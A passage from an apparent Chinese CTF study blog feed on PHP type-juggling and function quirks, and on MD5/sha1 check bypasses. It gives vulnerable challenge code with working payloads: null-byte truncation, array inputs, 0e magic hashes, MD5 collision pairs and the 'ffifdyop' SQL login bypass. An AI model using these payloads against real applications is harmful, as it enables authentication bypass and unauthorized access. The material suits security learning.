str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>在<strong>php5.3之前</strong>，当这个函数接受到了<strong>不符合的类型，这个函数将发生错误，显示了报错的警告信息后，将return 0。</strong></p><h2 id="ereg-，eregi-函数缺陷"><a href="#ereg-，eregi-函数缺陷" class="headerlink" title="ereg()，eregi()函数缺陷"></a>ereg()，eregi()函数缺陷</h2><p><code>int ereg(string pattern, string originalstring, [array regs])</code>函数<strong>用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回1,否则返回0，且搜索对大小写敏感</strong></p><p><code>ereg()</code>函数存在<strong>NULL截断漏洞</strong>，当传入的字符串包含<code>%00</code>时，只有**<code>%00</code>前的字符串会传入函数并执行<strong>，而后半部分不会传入函数判断。因此可以使用</strong><code>%00</code>截断，连接非法字符串，从而绕过函数**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>十六进制数 <code>0x36d</code>即十进制的 <code>877</code>，反转后是778</p><p>所以payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250120-194053.png"></p><h2 id="strlen-函数缺陷"><a href="#strlen-函数缺陷" class="headerlink" title="strlen()函数缺陷"></a>strlen()函数缺陷</h2><p>strlen()函数用于求字符串的长度，可以用科学计数法来绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">4</span> &amp;&amp; <span class="variable">$a</span>&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;is too small&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e9</span><br></pre></td></tr></table></figure><h2 id="strpos-函数缺陷"><a href="#strpos-函数缺陷" class="headerlink" title="strpos()函数缺陷"></a>strpos()函数缺陷</h2><p>strpos()函数用于查找字符串在另一字符串种第一次出现的位置（区分大小写）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="string">&#x27;abc&#x27;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里传入abc会打印123，但如果传入一个数组或不传入数据或传入没有<code>abc</code>的值都会打印123，这时因为该函数只解析<strong>string类型的字符串</strong>，给它个数组就不知到如何解析，就会返回<strong>null，null&#x3D;&#x3D;0</strong>，而当不传入数据或传入数据不包含<code>abc</code>时，就会由于找不到值而返回null。</p><h2 id="in-array-函数缺陷"><a href="#in-array-函数缺陷" class="headerlink" title="in_array()函数缺陷"></a>in_array()函数缺陷</h2><p>in_array()函数用来判断字符串是否存在与数组中，但是在判断的时候，会进行类型强制转换，就会出现数字比较的情况。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串变量解析特性"><a href="#字符串变量解析特性" class="headerlink" title="字符串变量解析特性"></a>字符串变量解析特性</h2><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串变量时，它会做两件事：</p><ul><li><strong>删除空白符</strong></li><li><strong>将某些字符<code>[+.</code>等等转换为下划线（包括空格）</strong></li></ul><p>例如：</p><table><thead><tr><th>User input</th><th>Decoded PHP</th><th>variable name</th></tr></thead><tbody><tr><td>%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td>foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td>foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/3181170-20230517204753959-1827760493.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a_b_c_d&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="string">&quot;hello&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250120-200636.png"></p><p><strong>需要注意的是，当php版本小于8时，GET传参请求的参数名含有非法字符<code>.</code>，会被转为<code>_</code>，但如果参数名前面有<code>[</code>，这个<code>[</code>会被直接转为<code>_</code>，但如果后面有<code>.</code>，这个<code>.</code>就不会被转为<code>_</code>.</strong></p><p>如果有一个 WAF 规定<strong>某个参数的值必须是数字，不能包含字母时，我们就可以利用这个绕过。</strong></p><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250120-202011.png"></p><p>如上面**<code>[RoarCTF 2019]Easy Calc</code><strong>要求我们num变量必须为数字，此时</strong>我们可通过<code>?%20num=phinfo()</code>绕过**</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nivi4.notion.site/PHP-8b2e93df6683422f815651f12d1b97c7">https://nivi4.notion.site/PHP-8b2e93df6683422f815651f12d1b97c7</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15388795.html">https://www.cnblogs.com/murkuo/p/15388795.html</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/17410173.html">https://www.cnblogs.com/gxngxngxn/p/17410173.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 黑魔法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5和sha1绕过总结</title>
      <link href="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="弱比较类型"><a href="#弱比较类型" class="headerlink" title="弱比较类型"></a>弱比较类型</h2><ul><li><p>php中的等比较运算符有两种，<code>==</code>和<code>===</code>。</p><ul><li><code>==</code>：先将左右两边类型转化成一致，再进行比较值是否一致</li><li><code>===</code>：先比较左右类型是否一致，若一致再比较值是否一致</li></ul></li><li><p><strong>字符串与数字比较</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&#x27;a&#x27; == 0);//bool(true)</span><br><span class="line">var_dump(&#x27;1a&#x27; == 1);//bool(true)</span><br><span class="line">var_dump(&#x27;12a&#x27; == 1);//bool(false)</span><br></pre></td></tr></table></figure><blockquote><p><strong>字符串在和数字比较的时候会将字符串转化为数字，如果字符串是以数字开头的，则会转换成数字再做比较，纯字符串则转换失败成false</strong></p></blockquote><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></li><li><p><strong>布尔值与任意值比较</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(True == 0);//bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);//bool(true)</span><br><span class="line">var_dump(True == 2);//bool(true)</span><br></pre></td></tr></table></figure></li><li><p><strong>hash值和字符串“0”比较</strong></p><p>因为当hash开头为0e后全为数字的话，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$str1 = &quot;a&quot;;</span><br><span class="line">echo md5($str1);//0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">var_dump(md5($str1) == &#x27;0&#x27;);//bool(false)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str2 = &quot;s224534898e&quot;;</span><br><span class="line">echo md5($str2);//0e420233178946742799316739797882</span><br><span class="line">var_dump(md5($str2) == &#x27;0&#x27;);//bool(true)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str3 = &#x27;a1b2edaced&#x27;;</span><br><span class="line">echo md5($str3);//0e45ea817f33691a3dd1f46af81166c4bool</span><br><span class="line">var_dump(md5($str3) == &#x27;0&#x27;);//bool(false)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);//bool(true) </span><br></pre></td></tr></table></figure><blockquote><p><strong>第二、四条由于0e后全为数字，按科学计数法即0乘e的幂次方为0，所以比较为true</strong></p></blockquote></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="strcmp函数绕过"><a href="#strcmp函数绕过" class="headerlink" title="strcmp函数绕过"></a>strcmp函数绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>strcmp(string1,string2)</code>，该函数返回：</p><blockquote><p><strong>0 - 如果两个字符串相等</strong></p><p><strong><code>&lt;</code>0 - 如果 string1 小于 string2</strong></p><p><strong><code>&gt;</code>0 - 如果 string1 大于 string2</strong></p></blockquote><p><strong>对于传入非字符串类型的数据的时候，strcmp函数会报错，将返回0。所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制，构建payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1</span><br></pre></td></tr></table></figure><h3 id="MD5-sha1弱类型绕过"><a href="#MD5-sha1弱类型绕过" class="headerlink" title="MD5&#x2F;sha1弱类型绕过"></a>MD5&#x2F;sha1弱类型绕过</h3><ul><li><p><strong>0e绕过</strong></p><p><strong>弱比较会把0exxxx当做科学计数法，不管后面的值为任何东西，0的任何次幂都为0</strong></p><p>一些字符串md5值以0e开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s21587387a</span><br><span class="line">0e215962017</span><br></pre></td></tr></table></figure><p>sha1值以0e开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure></li><li><p><strong>数组绕过</strong></p><p><strong>md5()函数计算的是一个字符串的哈希值，对于数组则返回false，如果是<code>md5((string)$apple) == md5((string)$banana))</code>则不能用数组，因为转换成字符串后都为NULL</strong></p></li></ul><h3 id="MD5-sha1强类型绕过"><a href="#MD5-sha1强类型绕过" class="headerlink" title="MD5&#x2F;sha1强类型绕过"></a>MD5&#x2F;sha1强类型绕过</h3><p><strong>因为强类型比较，不仅比较值，还比较类型，0e会被当做字符串，所以不能用0e来进行</strong><br><strong>但是我们可以用MD值完全相同的字符来进行绕过。</strong></p><ul><li><p><strong>数组绕过</strong></p><p>方法同上</p></li><li><p><strong>MD5强碰撞</strong></p><p><strong>即找到两个不同输入产生相同哈希值的过程。</strong></p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br><span class="line">b=0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br></pre></td></tr></table></figure></li></ul><h3 id="特定条件下的MD验证绕过：ffifdyop"><a href="#特定条件下的MD验证绕过：ffifdyop" class="headerlink" title="特定条件下的MD验证绕过：ffifdyop"></a>特定条件下的MD验证绕过：ffifdyop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from ’admin’ where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20240304204716.png"></p><p>即MD5报文将以原始 16字符二进制格式返回</p><p>ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c<br>再转换成字符串为’or’6乱码</p><p>Select * from ’admin’ where password&#x3D;‘or’6乱码 相当于万能密码</p><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>extract():函数从数组中将变量导入到当前的符号表</strong><br><strong>trim(string[charlist]):移除字符串两侧的空白字符或其他预定义字符，若省略后面一个参数，则去除<code>\0</code>、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>和空格。</strong></p></blockquote><p>运用extract()将GET方式获得的变量导入到当前的符号表中，然后判断$flag和$shiyan两个变量的内容是否相等。那么我们将$flag和$shiyan这两个变量的内容都会被设置成空字符串。构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></figure><h3 id="限制传入的匹配"><a href="#限制传入的匹配" class="headerlink" title="限制传入的匹配"></a>限制传入的匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)  <span class="comment">//判断是否包含-，!==既比较值也比较类型</span></span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>ereg()：限制传入内容，例如上面就是限制了只能传入数字以及大小写字母。</strong><br><strong>strpos()：查找字符串在另一字符串中第一次出现的位置。</strong></p></blockquote><p>对传入进行限制，但是又要求密码中含有–，因此我们这里有两种绕过方法：</p><ul><li><p><strong>数组法</strong></p><p>同样strpos()如果传入数组，会返回NULL，从而绕过对<code>--</code>的检测，构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]=1</span><br></pre></td></tr></table></figure></li><li><p><strong>截断法</strong></p><p>在<code>%00</code>后的函数无法识别，因此构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1%00--</span><br></pre></td></tr></table></figure></li></ul><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0&#x3D;&#x3D;”admin”这种形式绕过，构建payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;&quot;key&quot;:0&#125;</span><br></pre></td></tr></table></figure><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span 